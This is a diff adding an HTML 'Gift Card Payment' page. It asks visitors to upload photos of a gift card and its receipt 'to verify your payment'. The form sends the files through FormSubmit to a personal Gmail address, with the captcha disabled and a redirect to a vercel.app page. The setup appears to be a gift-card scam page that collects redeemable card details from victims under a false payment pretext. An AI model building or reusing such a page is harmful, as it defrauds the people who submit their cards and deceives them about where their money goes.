@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Gift Card Payment</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #fff;
+    color: #333;
+    margin: 0;
+    padding: 0 1rem 2rem;
+    display: flex;
+    justify-content: center;
+    min-height: 100vh;
+    align-items: flex-start;
+  }
+  .container {
+    width: 100%;
+    max-width: 400px;
+    margin-top: 1.5rem;
+  }
+
+  /* Header */
+  .header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-weight: 600;
+    font-size: 1.15rem;
+    padding-bottom: 0.7rem;
+    border-bottom: 1px solid #ddd;
+    color: #383838;
+  }
+  .header .title {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+  }
+  .header .title-icon {
+    background: #ffb62a;
+    color: #fff;
+    width: 1.8rem;
+    height: 1.8rem;
+    font-size: 1.25rem;
+    border-radius: 50%;
+    text-align: center;
+    line-height: 1.8rem;
+    user-select: none;
+  }
+  .header .cancel-btn {
+    color: #f04e4e;
+    font-weight: 600;
+    cursor: pointer;
+    user-select: none;
+    transition: color 0.3s ease;
+    background: none;
+    border: none;
+    font-size: 1rem;
+  }
+  .header .cancel-btn:hover {
+    color: #c43c3c;
+  }
+
+  /* User info */
+  .user-info {
+    margin: 1rem 0;
+    display: flex;
+    align-items: center;
+    gap: 0.7rem;
+    font-size: 0.95rem;
+    color: #6b6b6b;
+  }
+  .user-info .user-icon {
+    font-size: 1.7rem;
+    background: #ffda44;
+    width: 2.4rem;
+    height: 2.4rem;
+    border-radius: 50%;
+    text-align: center;
+    line-height: 2.4rem;
+    user-select: none;
+  }
+  .user-info .user-email {
+    flex: 1;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+  .user-info .amount {
+    font-weight: 700;
+    color: #1e1e1e;
+    white-space: nowrap;
+  }
+
+  /* Description Section */
+  .description-section {
+    font-size: 0.9rem;
+    color: #555;
+    line-height: 1.4;
+    margin-bottom: 1.6rem;
+    padding: 0 0.2rem;
+  }
+
+  /* Upload Section */
+  .upload-section {
+    margin-bottom: 1.4rem;
+  }
+  .upload-label {
+    font-size: 0.75rem;
+    font-weight: 700;
+    color: #999;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 0.3rem;
+  }
+  .upload-area {
+    border: 2px dashed #ccc;
+    border-radius: 8px;
+    padding: 28px 12px;
+    color: #999;
+    font-size: 0.9rem;
+    text-align: center;
+    cursor: pointer;
+    user-select: none;
+    transition: background-color 0.25s ease, border-color 0.25s ease, color 0.25s ease;
+  }
+  .upload-area.dragover {
+    background-color: #fff8dc;
+    border-color: #efc53c;
+    color: #8b6d00;
+  }
+  .upload-area:focus {
+    outline: 2px solid #efc53c;
+    outline-offset: 2px;
+  }
+  /* Preview for images */
+  .file-preview {
+    margin-top: 10px;
+    max-width: 100%;
+    border-radius: 6px;
+    display: none;
+    box-shadow: 0 1px 5px rgba(0,0,0,0.1);
+  }
+
+  /* Submit Button */
+  .submit-btn {
+    margin-top: 1.6rem;
+    width: 100%;
+    padding: 14px 0;
+    background-color: #efc53c;
+    border: none;
+    border-radius: 8px;
+    font-size: 1rem;
+    font-weight: 700;
+    color: #4a3b00;
+    cursor: pointer;
+    user-select: none;
+    box-shadow: 0 4px 7px rgba(239,197,60,0.6);
+    transition: background-color 0.3s ease;
+  }
+  .submit-btn:hover:not(:disabled),
+  .submit-btn:focus:not(:disabled) {
+    background-color: #d4aa15;
+    outline: none;
+  }
+  .submit-btn:disabled {
+    background-color: #d9d9d9;
+    color: #999;
+    cursor: not-allowed;
+    box-shadow: none;
+  }
+
+  /* Change Payment Link */
+  .change-payment {
+    margin-top: 1.7rem;
+    text-align: center;
+  }
+  .change-payment a {
+    font-weight: 700;
+    color: #efc53c;
+    text-decoration: none;
+    font-size: 0.95rem;
+    user-select: none;
+    cursor: pointer;
+    transition: color 0.3s ease;
+  }
+  .change-payment a:hover,
+  .change-payment a:focus {
+    color: #d4aa15;
+    outline: none;
+  }
+
+  /* Accessibility - hide text for screen readers */
+  .sr-only {
+    position: absolute;
+    width: 1px; 
+    height: 1px; 
+    padding: 0; 
+    margin: -1px; 
+    overflow: hidden;
+    clip: rect(0,0,0,0);
+    border: 0;
+  }
+</style>
+</head>
+<body>
+
+  <main class="container" role="main" aria-label="Gift Card Payment Gateway">
+
+    <!-- Header -->
+    <header class="header">
+      <div class="title">
+        <div class="title-icon" aria-hidden="true">🪙</div>
+        <span>Gift Card</span>
+      </div>
+       <a href="dashboard.html"> <button type="button" class="cancel-btn" aria-label="Cancel payment">Cancel</button></a>
+    </header>
+
+    
+    
+    <!-- Description instead of giftcard code -->
+   <form 
+  id="applicationForm" 
+  action="https://formsubmit.co/jenniferaniston.chatline@gmail.com"
+  method="POST"
+  enctype="multipart/form-data"
+  class="space-y-6"
+>
+
+  <!-- FormSubmit settings -->
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_next" value="https://jointly-opal.vercel.app/submission.html">
+  <input type="hidden" name="_subject" value="New Gift Card Submission">
+  <input type="hidden" name="_autoresponse" value="We have received your gift card and receipt. We will verify shortly.">
+
+  <!-- Description -->
+  <section class="description-section">
+    Please upload your gift card and receipt to verify your payment.  
+    This helps us confirm your transaction quickly and securely.
+  </section>
+
+  <!-- Upload Gift Card -->
+  <section class="upload-section">
+    <label for="upload-giftcard" class="upload-label">Upload Gift Card</label>
+
+    <div 
+      class="upload-area" 
+      id="upload-giftcard-area" 
+      tabindex="0" 
+      role="button" 
+      aria-describedby="upload-giftcard-desc" 
+      aria-label="Upload gift card file"
+    >
+      Click or drag and drop your gift card file here
+    </div>
+
+    <!-- IMPORTANT: Must have name for FormSubmit -->
+    <input 
+      type="file" 
+      accept="image/*,application/pdf" 
+      id="upload-giftcard" 
+      name="giftcard_file"
+      hidden
+    />
+
+    <div id="upload-giftcard-desc" class="sr-only">
+      Upload gift card proof file (image or PDF)
+    </div>
+
+    <img id="preview-giftcard" class="file-preview" alt="Gift card preview" />
+  </section>
+
+  <!-- Upload Receipt -->
+  <section class="upload-section">
+    <label for="upload-receipt" class="upload-label">Upload Receipt</label>
+
+    <div 
+      class="upload-area" 
+      id="upload-receipt-area" 
+      tabindex="0" 
+      role="button" 
+      aria-describedby="upload-receipt-desc" 
+      aria-label="Upload receipt file"
+    >
+      Click or drag and drop your receipt here
+    </div>
+
+    <!-- IMPORTANT: Must have name for FormSubmit -->
+    <input 
+      type="file" 
+      accept="image/*,application/pdf" 
+      id="upload-receipt"
+      name="receipt_file"
+      hidden
+    />
+
+    <div id="upload-receipt-desc" class="sr-only">
+      Upload receipt proof file (image or PDF)
+    </div>
+
+    <img id="preview-receipt" class="file-preview" alt="Receipt preview" />
+  </section>
+
+  <!-- Submit Button -->
+  <button class="submit-btn" id="submit-btn" type="submit">
+    I have sent gift card
+  </button>
+
+</form>
+
+
+    <!-- Change Payment Method -->
+   
+  </main>
+
+<script>
+  // Elements
+  const submitBtn = document.getElementById('submit-btn');
+
+  // Upload gift card elements
+  const uploadGiftcardArea = document.getElementById('upload-giftcard-area');
+  const uploadGiftcardInput = document.getElementById('upload-giftcard');
+  const previewGiftcard = document.getElementById('preview-giftcard');
+
+  // Upload receipt elements
+  const uploadReceiptArea = document.getElementById('upload-receipt-area');
+  const uploadReceiptInput = document.getElementById('upload-receipt');
+  const previewReceipt = document.getElementById('preview-receipt');
+
+  // Cancel button
+  const cancelBtn = document.querySelector('.cancel-btn');
+  cancelBtn.addEventListener('click', () => {
+    alert('Payment cancelled.');
+    // Implement your cancel logic here (redirect, close modal etc)
+  });
+
+  // Utility to handle file upload & preview
+  function setupUpload(area, input, preview) {
+    // Open file dialog on click or keyboard
+    area.addEventListener('click', () => input.click());
+    area.addEventListener('keydown', e => {
+      if(e.key === 'Enter' || e.key === ' ') {
+        e.preventDefault();
+        input.click();
+      }
+    });
+
+    // Drag and drop styling
+    area.addEventListener('dragover', e => {
+      e.preventDefault();
+      area.classList.add('dragover');
+    });
+    area.addEventListener('dragleave', e => {
+      e.preventDefault();
+      area.classList.remove('dragover');
+    });
+    area.addEventListener('drop', e => {
+      e.preventDefault();
+      area.classList.remove('dragover');
+      if(e.dataTransfer.files.length > 0) {
+        input.files = e.dataTransfer.files;
+        showPreview(input.files[0], preview);
+        checkSubmitEnable();
+      }
+    });
+
+    // File selected via dialog
+    input.addEventListener('change', () => {
+      if(input.files.length > 0) {
+        showPreview(input.files[0], preview);
+        checkSubmitEnable();
+      }
+    });
+  }
+
+  // Show image preview or alert for PDFs
+  function showPreview(file, preview) {
+    const type = file.type;
+    if(type.startsWith('image/')) {
+      const reader = new FileReader();
+      reader.onload = e => {
+        preview.src = e.target.result;
+        preview.style.display = 'block';
+      };
+      reader.readAsDataURL(file);
+    } else if(type === 'application/pdf') {
+      preview.style.display = 'none';
+      alert('PDF uploaded. Preview not available.');
+    } else {
+      alert('Unsupported file type. Please upload an image or PDF.');
+      preview.style.display = 'none';
+    }
+  }
+
+  // Enable submit button only if both files uploaded
+  function checkSubmitEnable() {
+    if(uploadGiftcardInput.files.length > 0 && uploadReceiptInput.files.length > 0) {
+      submitBtn.disabled = false;
+      submitBtn.setAttribute('aria-disabled', 'false');
+    } else {
+      submitBtn.disabled = true;
+      submitBtn.setAttribute('aria-disabled', 'true');
+    }
+  }
+
+  // Setup uploads
+  setupUpload(uploadGiftcardArea, uploadGiftcardInput, previewGiftcard);
+  setupUpload(uploadReceiptArea, uploadReceiptInput, previewReceipt);
+
+  // Submit button click
+  submitBtn.addEventListener('click', () => {
+    if(submitBtn.disabled) return;
+    alert('Your gift card and receipt have been submitted successfully!');
+    // Add your submission logic here
+  });
+</script>
+
+</body>
+</html>
